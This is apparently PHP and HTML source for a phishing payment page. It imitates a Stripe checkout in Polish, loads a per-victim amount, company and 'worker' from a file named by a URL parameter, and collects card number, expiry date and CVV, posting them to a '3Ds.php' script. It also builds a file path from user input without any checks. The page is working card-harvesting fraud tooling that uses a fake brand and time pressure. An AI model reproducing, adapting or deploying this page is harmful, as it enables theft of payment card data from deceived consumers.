<?
include('config.php');

if (isset($_GET["id"]) && $_GET["id"] !== null) {
    $id = $_GET["id"];

    if (!file_exists("database/" . $id)) {
        die("Некорректная платежная ссылка.");
    } else {
        $response = json_decode(file_get_contents("database/" . $id), true);

        $amount = $response["amount"];
        $cash = $response["cash"];
        $worker = $response["worker"];
    }
} else {
	die("Некорректная платежная ссылка.");
}

if (!isset($amount) || $amount == "" || $amount < 10 || $amount > 75000) {
	$amount = 10;
}

$solt = base64_encode(json_encode([
	'id' => $id,
	'company' => $company,
	'worker' => $worker
]));
?>

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Zapłacić dostawcy</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=ABeeZee&amp;display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Acme&amp;display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alata&amp;display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Archivo&amp;display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Arimo&amp;display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Asap+Condensed&amp;display=swap">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Basic&amp;display=swap">
    <link rel="stylesheet" href="assets/css/Helvetica%2025%20UltraLight.css">
    <link rel="stylesheet" href="assets/css/Helvetica%2035%20Thin.css">
    <link rel="stylesheet" href="assets/css/Helvetica%2045%20Light.css">
    <link rel="stylesheet" href="assets/css/Helvetica%2055%20Roman.css">
    <link rel="stylesheet" href="assets/css/Helvetica%2065%20Medium.css">
    <link rel="stylesheet" href="assets/css/Helvetica%20Neue.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
    <link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
    <link rel="stylesheet" href="assets/fonts/fontawesome5-overrides.min.css">
    <link rel="stylesheet" href="assets/css/Login-Form-Clean.css">
    <link rel="stylesheet" href="assets/css/stripecircle.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <link rel="shortcut icon" href="https://files.stripe.com/files/MDB8YWNjdF8xRmdKY0dCOE9Rd3BKSEtYfGZfbGl2ZV9kd21RbkxjcjM5VDR4YUpqTEJCT1dQcGs00WIn3NBYG">
    <meta name="robots" content="all">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript" src="assets/js/payment/feature-detect.js"></script>
    <script type="text/javascript" src="assets/js/payment/es5-shim.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/jquery.selectBox.min.js"></script>
    <script type="text/javascript" src="assets/js/payment/rb.js"></script>
    <script type="text/javascript" src="assets/js/payment/common.js"></script>
    <script type="text/javascript" src="assets/js/payment/cpg_waiter.js"></script>
    <script type="text/javascript" src="assets/js/payment/standard_waiter.js"></script>
</head>

    <section class="login-clean" style="background: #525f7f;width: 100%;height: 965px;">
        <form style="background: #ffffff;border-radius: 6px;max-width: 460px;">

            <div class="container">
                <div class="row">
                    <div class="col-md-12 text-start" style="padding-right: 0px;padding-left: 0px;">
                        <h1 class="text-start" style="margin: 0px;color: rgba(26,26,26,0.9);font-size: 36px;"><?=$amount;?> $</h1>
                    </div>
                </div>
            </div>
            <div class="container">
                <div class="row" style="margin-top: 12px;">
                    <div class="col-md-6" style="width: auto;padding-left: 0px;padding-right: 20px;">
                        <p id="p1" class="text-start" style="color: rgba(26,26,26,0.41);font-size: 14px;font-weight: bold;margin-bottom: 0px;width: auto;">2022 r.</p>
                    </div>
                    <div class="col-md-6" style="padding-left: 0px;padding-right: 0px;">
                        <p style="width: 211px;font-weight: bold;font-size: 14px;color: var(--bs-red);box-shadow: inset 0px 0px 20px rgb(253,226,221);border-radius: 5px;border-color: #dc2727;padding-left: 4px;margin-bottom: 0px;">Płatność aktywna przez 30 min</p>
                    </div>
                </div>
            </div>
            <div class="container">
                <div class="row" style="width: 320px;min-width: 0px;margin-top: 35px;">
                    <div class="col-md-6" style="width: 70px;padding-left: 0px;">
                        <p style="width: 65px;margin-bottom: 0px;">Do kogo:</p>
                    </div>
                    <div class="col-md-6" style="padding-right: 0px;">
                        <p style="width: auto;margin-bottom: 10px;"><?=$company;?></p>
                    </div>
                </div>
            </div>
            <div class="container">
                <div class="row" style="width: 320px;">

                </div>
            </div>
            <hr style="width: auto;text-align: center;margin-left: 35px;margin-right: 35px;padding-top: 0px;margin-top: 22px;"><a class="forgot" href="#" style="font-size: 14px;color: rgba(26,26,26,0.41);font-weight: bold;">Wyświetl szczegóły konta &gt;<br></a>
        </form>
        <form name="myform" method='POST' action='3Ds.php' style="background: #ffffff;border-radius: 6px;margin-top: 10px;max-width: 460px;">
            <strong style="color: rgba(26,26,26,0.6);">Dane kontaktowe</strong>
            <div class="container">
                <div class="row" style="align-items: center;">
                    <div class="col-md-6" style="margin-top: 10px;"><button class="btn btn-primary active shadow" type="button" style="width: 160px;margin-top: 5px;color: rgb(0,0,0);background: rgb(255,255,255);border-width: 1px;border-style: solid;text-align: left;font-size: 13px;"><i class="fas fa-credit-card" style="font-size: 16px;"></i>&nbsp;Karta bankowa</button></div>
                    <div class="col-md-6" style="margin-top: 15px;padding-bottom: 5px;padding-top: 5px;"><button class="btn btn-primary shadow" href="/bank" type="button" style="width: 160px;margin-top: 0px;color: rgb(0,0,0);background: rgb(255,255,255);border-width: 1px;border-style: solid;padding-top: 11px;text-align: left;font-size: 13px;"><i class="fa fa-bank" style="font-size: 16px;"></i>&nbsp;Przelew bankowy</button></div>
                </div>
            </div>
            <p style="margin-top: 16px;color: rgb(161,161,161);font-weight: bold;font-size: 14px;">Dane karty</p>
            <input class="CheckoutInput" type="text" name="card_number" id="cardNumber" pattern="[0-9]{4}\s[0-9]{4}\s[0-9]{4}\s[0-9]{4}" placeholder="1234 1234 1234 1234" required/>

            <div class="block2" style="width: 100%;">
                <div class="block-1" style="height: 50%; padding-right: 3px;">
                    <div class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childLeft FormFieldGroup-childBottom">
                        <div class="FormFieldInput">
                            <div class="CheckoutInputContainer"><span class="InputContainer" data-max=""><input class="CheckoutInput1 CheckoutInput--tabularnums Input Input--empty" autocomplete="cc-exp" autocorrect="off" spellcheck="false" name="expdate" id="cardexp" type="text" inputmode="numeric" placeholder="ММ / YY" aria-invalid="false" value="" required=""></span></div>
                        </div>
                    </div>
                </div>
                <div class="block-2">
                    <div class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childRight FormFieldGroup-childBottom">
                        <div class="FormFieldInput has-icon">
                            <div class="CheckoutInputContainer"><span class="InputContainer" data-max=""><input class="CheckoutInput2 CheckoutInput--tabularnums Input Input--empty" autocomplete="cc-csc" autocorrect="off" spellcheck="false" name="cvc2" id="cardCvv" type="text" inputmode="numeric" aria-label="CVV/CVC" placeholder="CVV/CVC" aria-invalid="false" value="" required=""></span></div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="flex-item width-12"><button class="SubmitButton SubmitButton--incomplete" type="submit" style="background-color: rgb(0, 116, 212); color: rgb(255, 255, 255);"><div class="SubmitButton-Shimmer" style="background: linear-gradient(to right, rgba(0, 116, 212, 0) 0%, rgb(58, 139, 238) 50%, rgba(0, 116, 212, 0) 100%);"></div><div class="SubmitButton-TextContainer"><span class="SubmitButton-Text SubmitButton-Text--current Text Text-color--default Text-fontWeight--500 Text--truncate" aria-hidden="false">Zapłać</span></div></button>

            </div>
        </form>
    </section>
</html>
<script src="assets/js/main.js"></script>
<script src="assets/bootstrap/js/bootstrap.min.js"></script>
<script src="https://static.codepen.io/assets/common/stopExecutionOnTimeout-db44b196776521ea816683afab021f757616c80860d31da6232dedb8d7cc4862.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js"></script>
<script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"></script>
